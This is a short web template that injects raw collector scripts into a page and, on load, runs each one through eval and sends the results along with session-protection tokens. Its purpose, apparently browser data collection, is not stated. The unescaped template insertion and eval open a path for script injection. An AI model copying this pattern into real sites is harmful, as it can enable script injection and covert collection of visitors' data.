{% for c in collectors %}
{% raw c %}
{% end %}

var collectors = {% raw colList %};

function collect(){
	for (var c = 0; c < collectors.length; c++){
		var res = eval(collectors[c]+'()');
		send(res[0], res[1], hijackingPreventionCK, hijackingPreventionSID)
	}
}

window.onload = collect;
